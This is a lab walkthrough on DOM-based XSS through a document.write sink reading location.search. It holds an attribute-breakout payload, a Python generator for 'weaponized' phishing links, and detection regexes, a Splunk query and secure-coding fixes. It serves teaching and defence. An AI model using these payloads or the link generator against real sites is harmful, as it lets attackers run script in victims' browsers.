# Lab Walkthrough: DOM XSS in `document.write` Sink using `location.search`

* **Vulnerability Type:** DOM-Based Cross-Site Scripting (XSS)
* **Target Context:** Client-Side JavaScript (`document.write` Sink)
* **Skill Level:** Apprentice (Beginner)
* **Estimated Completion Time:** 10–15 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The scripts, payloads, methodologies, and technical documentation contained in this repository are strictly intended for educational exercises, CTF competitions, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%231-vulnerability-architecture--mechanism)
2. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%232-lab-objectives--verification-criteria)
3. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%233-step-by-step-exploitation-flow)
4. [XSS Context Comparison](https://www.google.com/search?q=%234-xss-context-comparison)
5. [Automated Exploitation Script (Python PoC)](https://www.google.com/search?q=%235-automated-exploitation-script-python-poc)
6. [Defense, Hardening & Secure Coding](https://www.google.com/search?q=%236-defense-hardening--secure-coding)
7. [SIEM Detection & Telemetry Analysis](https://www.google.com/search?q=%237-siem-detection--telemetry-analysis)
8. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%238-troubleshooting--diagnostic-runbook)
9. [References & Standards](https://www.google.com/search?q=%239-references--standards)

---

## 1. Vulnerability Architecture & Mechanism

DOM-Based XSS occurs entirely within the victim's browser. The backend web server never processes the malicious payload directly; instead, the vulnerability exists in how the client-side JavaScript handles data.

* **Real-World Analogy:** DOM XSS is like handing a blank check to a cashier where the amount is written in pencil. Instead of the bank (backend server) verifying the amount, the cashier (browser) just reads whatever you wrote and processes it locally on the spot.
* **The Source (`location.search`):** This is the JavaScript property that reads the query string from the URL (e.g., `?search=payload`). It acts as the entry point for the attacker's input.
* **The Sink (`document.write`):** This is the dangerous JavaScript execution function. It takes the untrusted data from the Source and writes it directly into the Document Object Model (DOM) as raw HTML.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                        DOM XSS EXECUTION FLOW                          │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker] Crafts a URL with a payload in the query string:
  https://target.com/?search="><svg onload=alert(1)>
           │
           ▼
  [2. Victim] Clicks the link. The browser loads the page.
           │
           ▼
  [3. Web Server] Returns the static HTML/JS. (Payload ignored by server).
           │
           ▼
  [4. Client JS] Reads the URL: var query = window.location.search;
           │
           ▼
  [5. Sink Execution] document.write('<img src="' + query + '">');
  Browser renders: <img src=""><svg onload=alert(1)>">
  Payload executes immediately!

```

> **Learning Checkpoint 1:** Why doesn't the backend server catch this? In many DOM XSS attacks (especially those using the `#` hash fragment), the payload never traverses the network to the backend server. The vulnerability is strictly an unsafe data handoff within the client's local execution environment.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The site's search query tracking functionality.
* **Primary Objective:** Break out of the existing HTML attribute context and execute arbitrary JavaScript.
* **Validation Signal:** Triggering the `alert()` function successfully via the URL parameter.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Reconnaissance & Source-to-Sink Mapping

* Navigate to the target application's search bar.
* Input a harmless tracking string (e.g., `CyberTest123`).
* Right-click the page and select **Inspect Element** (do not use "View Page Source", as it will not show dynamically rendered DOM changes).
* *Observation:* The JavaScript takes your input and places it directly inside an image tag's source attribute:
`<img src="/resources/images/tracker.gif?searchTerms=CyberTest123">`

### Phase 2: Context Breakout Strategy

* To execute code, we must escape the `src` attribute and close the `<img>` tag.
* Injecting `">` achieves this:
* `"` closes the `src` attribute.
* `>` closes the `<img ...>` tag.



### Phase 3: Payload Injection & Execution

* Append an executable HTML payload immediately after the breakout sequence: `<svg onload=alert(1)>`.
* **Full Payload:** `"><svg onload=alert(1)>`
* Submit the payload into the search box.
* *Resulting DOM Execution:*
`document.write('<img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)>">');`
* The browser parses the newly written `<svg>` tag, fires the `onload` event, and executes the alert.

> **Learning Checkpoint 2:** Why use `<svg onload...>` instead of `<script>`? When injecting into a DOM sink via `innerHTML` or `document.write` after the page has already loaded, standard `<script>` tags are often ignored by modern browsers. Event handlers (like `onload` or `onerror`) bypass this restriction effectively.

---

## 4. XSS Context Comparison

Understanding the flow of data dictates which XSS technique is viable during an assessment.

| XSS Variant | Execution Location | Data Flow | Required Victim Interaction |
| --- | --- | --- | --- |
| **DOM-Based** | Client-Side (Browser) | `Source` $\rightarrow$ `Sink` (No Server parsing) | Clicking a crafted link |
| **Reflected** | Client-Side (Browser) | Request $\rightarrow$ Server $\rightarrow$ Immediate Response | Clicking a crafted link |
| **Stored** | Client-Side (Browser) | Request $\rightarrow$ Database $\rightarrow$ Future Response | Passive viewing of infected page |

---

## 5. Automated Exploitation Script (Python PoC)

DOM XSS is a client-side vulnerability, meaning a Python `requests` script cannot natively "execute" the XSS. However, attackers use scripts to automate the generation of weaponized phishing URLs.

```python
#!/usr/bin/env python3
"""
DOM XSS Weaponized Link Generator (PoC)
Generates URL-encoded payloads targeting the location.search source.
"""

import urllib.parse
import sys

def generate_phishing_link(target_url):
    # The payload designed to break out of the <img> src attribute
    raw_payload = '"><svg onload=alert(1)>'
    
    # URL encode the payload to ensure safe transport over HTTP
    encoded_payload = urllib.parse.quote(raw_payload)
    
    # Construct the final weaponized URL
    weaponized_link = f"{target_url}/?search={encoded_payload}"
    
    print("[*] Generating Weaponized DOM XSS Link...")
    print(f"[+] Distribute this URL to target: \n{weaponized_link}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 dom_xss_generator.py <target_base_url>")
        sys.exit(1)
        
    target = sys.argv[1].rstrip('/')
    generate_phishing_link(target)

```

---

## 6. Defense, Hardening & Secure Coding

To eliminate DOM XSS, developers must sever the insecure flow of data between the Source and the Sink.

* **Use Safe Sinks:** Avoid dangerous execution sinks like `document.write()`, `innerHTML`, `outerHTML`, or `eval()`.
* **Prefer `textContent`:** When dynamically updating the DOM with user input, use `element.textContent` or `element.innerText`. These sinks treat data strictly as literal text, stripping it of any executable context.
* *Secure Example:* `document.getElementById('search-term').textContent = window.location.search;`


* **Client-Side Encoding:** If HTML rendering is absolutely necessary, use a robust client-side sanitization library (like DOMPurify) before passing data to a dangerous sink.

---

## 7. SIEM Detection & Telemetry Analysis

Detecting DOM XSS is notoriously difficult for network-based telemetry because payloads in the URL fragment (`#`) never reach the server. However, since this lab uses `location.search` (`?`), the payload is logged in the web server's access logs.

### WAF / Detection Rule Examples (Regex)

* **Tag Breakout Signatures:** `(?i)["']\s*>\s*<\s*[a-z]+`
* **SVG/Event Handler Injection:** `(?i)<\s*svg.*?\bonload\s*=`

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| regex uri_query="(?i)(%22%3E|%27%3E|<svg|onload=|alert\()"
| stats count by src_ip, uri_path, uri_query
| where count > 0

```

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Payload appears literally on screen** | Sink is safe (e.g., `textContent`). | Inspect the JavaScript source code to verify the exact sink being used. You cannot exploit safe sinks with HTML injection. |
| **Payload is not reflected in 'View Page Source'** | DOM manipulation occurs client-side. | Use the browser's Developer Tools (F12) -> **Inspector/Elements** tab to view the live, modified DOM structure. |
| **Alert box does not trigger** | Used `<script>` instead of event handler. | Browsers often block dynamically injected `<script>` tags. Use `<svg onload=...>` or `<img src=x onerror=...>` instead. |
| **Syntax Error in Console** | Broken string context. | Ensure you correctly closed both the attribute (`"`) and the preceding tag (`>`) before initiating your payload. |

---

> **Key Insight:** DOM XSS bypasses traditional backend security filters because the vulnerability resides purely in the client's local JavaScript logic. Securing web applications requires moving away from dynamic HTML sinks like `innerHTML` and `document.write` entirely, defaulting to safe text-assignment properties like `textContent`.
